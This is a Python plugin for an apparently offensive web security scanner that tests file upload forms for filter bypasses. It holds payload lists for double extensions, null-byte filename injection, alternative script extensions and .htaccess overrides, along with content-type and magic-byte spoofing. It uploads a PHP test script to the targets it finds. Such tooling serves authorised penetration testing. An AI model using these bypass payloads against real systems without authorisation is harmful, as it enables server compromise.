"""File upload bypass — double ext, null byte, content-type, magic bytes."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.http import resolve_base_urls

logger = logging.getLogger(__name__)

# Upload bypass payloads
EXTENSION_BYPASSES = [
    ("shell.php.jpg", "Double extension"),
    ("shell.pHp", "Case variation"),
    ("shell.php5", "Alternative PHP extension"),
    ("shell.phtml", "PHTML extension"),
    ("shell.php%00.jpg", "Null byte injection"),
    ("shell.php;.jpg", "Semicolon bypass"),
    ("shell.php.png", "PHP with PNG extension"),
    ("shell.php%0a", "Newline bypass"),
    ("shell.php...", "Trailing dots"),
    ("shell.php ", "Trailing space"),
    ("shell.shtml", "SSI extension"),
    ("shell.asp", "ASP extension"),
    ("shell.aspx", "ASPX extension"),
    ("shell.jsp", "JSP extension"),
    ("shell.war", "WAR deployment"),
    (".htaccess", "Apache htaccess override"),
]

# Content-type bypasses
CONTENT_TYPE_BYPASSES = [
    "image/jpeg", "image/png", "image/gif",
    "application/octet-stream", "text/plain",
]

# Magic bytes for file type spoofing
MAGIC_BYTES = {
    "gif": b"GIF89a",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpg": b"\xff\xd8\xff\xe0",
    "pdf": b"%PDF-1.4",
}


class FileUploadBypassPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="file_upload_bypass",
        display_name="File Upload Bypass",
        category=PluginCategory.EXPLOITATION,
        description=(
            "File upload filter bypass: double ext, null byte, "
            "content-type spoofing, magic bytes"
        ),
        depends_on=["web_crawler"],
        produces=["upload_bypass"],
        timeout=90.0,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        findings: list[Finding] = []
        data: dict = {"forms": [], "bypasses": []}

        # Find upload forms from crawler data
        forms = ctx.state.get("discovered_forms", {}).get(target.host, [])
        upload_forms = []
        for f in forms:
            inputs = f.get("inputs", [])
            has_file = False
            if isinstance(inputs, dict):
                # dict[str, str] → check if any key suggests file upload
                has_file = any("file" in k.lower() for k in inputs)
            elif isinstance(inputs, list):
                for inp in inputs:
                    if (isinstance(inp, dict) and inp.get("type") == "file") or (
                        isinstance(inp, str) and "file" in inp.lower()
                    ):
                        has_file = True
                        break
            if has_file:
                upload_forms.append(f)

        if not upload_forms:
            # Try to find upload endpoints in crawled URLs
            crawled = ctx.state.get("crawled_urls", {}).get(target.host, [])
            upload_keywords = ["upload", "file", "attach", "import", "media"]
            upload_urls = [
                url for url in crawled
                if any(kw in url.lower() for kw in upload_keywords)
            ]
            if upload_urls:
                data["potential_upload_urls"] = upload_urls[:20]
                findings.append(Finding.info(
                    f"Potential upload endpoints found: {len(upload_urls)}",
                    evidence="\n".join(upload_urls[:10]),
                    tags=["upload"],
                ))
            else:
                findings.append(Finding.info(
                    "No file upload forms discovered",
                    tags=["upload"],
                ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Test each upload form
        base_urls = await resolve_base_urls(target, ctx)
        base_url = base_urls[0] if base_urls else f"https://{target.host}"

        for form in upload_forms[:3]:
            if ctx.should_stop:
                break
            action = form.get("action", "")
            if action.startswith("/"):
                upload_url = base_url + action
            elif action.startswith("http"):
                upload_url = action
            else:
                upload_url = base_url + "/" + action

            await self._test_upload(ctx, upload_url, form, findings, data)

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    async def _test_upload(self, ctx, url, form, findings, data):
        """Test upload form with various bypass techniques."""
        file_input = None
        for inp in form.get("inputs", []):
            if inp.get("type") == "file":
                file_input = inp.get("name", "file")
                break
        if not file_input:
            return

        php_payload = b'<?php echo "UPLOAD_TEST_OK"; ?>'

        for filename, technique in EXTENSION_BYPASSES[:8]:
            if ctx.should_stop:
                break
            for content_type in CONTENT_TYPE_BYPASSES[:3]:
                # Build multipart form data with magic bytes
                body = MAGIC_BYTES.get("gif", b"") + b"\n" + php_payload
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            url,
                            data={file_input: (filename, body, content_type)},
                            timeout=10.0,
                        )
                        resp_text = await resp.text(
                            encoding="utf-8", errors="replace",
                        )
                        if resp.status in (200, 301, 302) and (
                            "success" in resp_text.lower()
                            or "upload" in resp_text.lower()
                        ):
                            data["bypasses"].append({
                                "technique": technique,
                                "filename": filename,
                                "content_type": content_type,
                                "status": resp.status,
                            })
                            findings.append(Finding.high(
                                f"Upload bypass: {technique} ({filename})",
                                evidence=(
                                    f"URL: {url}\n"
                                    f"Filename: {filename}\n"
                                    f"Content-Type: {content_type}\n"
                                    f"Status: {resp.status}"
                                ),
                                description="File upload filter may be bypassable",
                                remediation=(
                                    "Validate file content (magic bytes), "
                                    "not just extension/content-type"
                                ),
                                tags=["upload", "bypass"],
                            ))
                            return  # One bypass is enough
                except Exception:
                    continue
